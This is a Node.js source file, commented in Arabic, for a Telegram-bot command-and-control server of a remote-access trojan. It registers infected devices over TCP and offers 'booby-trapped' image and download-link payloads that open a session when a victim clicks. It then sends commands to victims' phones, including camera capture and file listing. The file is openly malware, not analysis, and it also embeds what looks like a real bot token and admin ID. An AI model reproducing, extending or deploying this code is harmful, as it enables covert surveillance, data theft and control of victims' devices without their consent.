const { Telegraf, Markup } = require('telegraf');
const net = require('net');
const fs = require('fs');

// --- إعدادات السيادة والمزامنة (التوكن والآيدي مدمجين) ---
const TOKEN = "7579044776:AAHmovdlHgnuife-wnFrmJqU_q1_OFQz97I";
const ADMIN_ID = 6654753506; 
const PORT = 10000;
const HOST_URL = "your-app-name.onrender.com"; // تأكد من وضع رابط تطبيقك هنا

let activeAgents = {}; 
const bot = new Telegraf(TOKEN);

// --- 1. خادم الاستقبال (C2 Server) ---
const server = net.createServer((socket) => {
    socket.setKeepAlive(true, 60000);
    
    socket.once('data', (data) => {
        try {
            const info = JSON.parse(data.toString());
            const agentId = info.hostname || `Device_${Math.floor(Math.random()*1000)}`;
            activeAgents[agentId] = { socket, info };

            // إشعار الجلسة الجديدة
            bot.telegram.sendMessage(ADMIN_ID, 
                `✅ **جلسة جديدة نشطة!**\n\n` +
                `📱 الجهاز: ${info.hostname}\n` +
                `🔋 البطارية: ${info.battery}%\n` +
                `🖥️ النظام: ${info.platform}\n` +
                `🔌 الشحن: ${info.charging ? 'متصل' : 'غير متصل'}`, { parse_mode: 'Markdown' });
        } catch (e) { console.log("Error Parsing Data"); }
    });

    socket.on('error', () => {});
    socket.on('close', () => {});
});
server.listen(PORT, '0.0.0.0');

// --- 2. القائمة الرئيسية ---
bot.start((ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    ctx.reply('🛡️ مركز العمليات جاهز. التحكم متاح لك فقط:', 
        Markup.inlineKeyboard([
            [Markup.button.callback('📱 الأجهزة المتصلة', 'list_agents')],
            [Markup.button.callback('🛠️ أدوات التلغيم', 'payload_tools')]
        ])
    );
});

// --- 3. معالج أدوات التلغيم (Payload Tools) ---
bot.action('payload_tools', (ctx) => {
    ctx.answerCbQuery();
    ctx.reply('🛠️ **قائمة التلغيم:**\nاختر نوع العملية المطلوبة:', 
        Markup.inlineKeyboard([
            [Markup.button.callback('🖼️ تلغيم صورة', 'bind_img')],
            [Markup.button.callback('🔗 إنشاء رابط ملغم', 'bind_link')]
        ])
    );
});

bot.action('bind_link', (ctx) => {
    ctx.answerCbQuery();
    ctx.reply(`🔗 الرابط الملغم الخاص بك:\nhttps://${HOST_URL}/download\n\nبمجرد فتح الضحية للرابط، ستظهر الجلسة هنا.`);
});

// --- 4. إدارة الجلسات والتحكم ---
bot.action('list_agents', (ctx) => {
    ctx.answerCbQuery();
    const ids = Object.keys(activeAgents);
    if (ids.length === 0) return ctx.reply("❌ لا توجد جلسات مفتوحة حالياً.");
    
    let buttons = ids.map(id => [Markup.button.callback(`🎮 تحكم: ${id} (${activeAgents[id].info.battery}%)`, `manage_${id}`)]);
    ctx.reply("🌐 الجلسات النشطة:", Markup.inlineKeyboard(buttons));
});

bot.action(/^manage_/, (ctx) => {
    const id = ctx.match.input.split('_')[1];
    ctx.reply(`🎮 التحكم في الضحية ${id}:`, 
        Markup.inlineKeyboard([
            [Markup.button.callback('📸 تصوير', `cmd_${id}_cam`), Markup.button.callback('📳 اهتزاز', `cmd_${id}_vibrate`)],
            [Markup.button.callback('📂 ملفات', `cmd_${id}_ls`), Markup.button.callback('🔔 إشعار', `cmd_${id}_alert`)]
        ])
    );
});

// إرسال الأوامر الفعلية
bot.action(/^cmd_/, (ctx) => {
    const parts = ctx.match.input.split('_');
    const id = parts[1];
    const cmd = parts[2];
    
    if (activeAgents[id]) {
        activeAgents[id].socket.write(cmd);
        ctx.answerCbQuery(`🚀 تم إرسال أمر ${cmd}`);
    } else {
        ctx.reply("❌ انقطع اتصال الجهاز.");
    }
});

bot.launch();
console.log("System Online with Admin ID: " + ADMIN_ID);
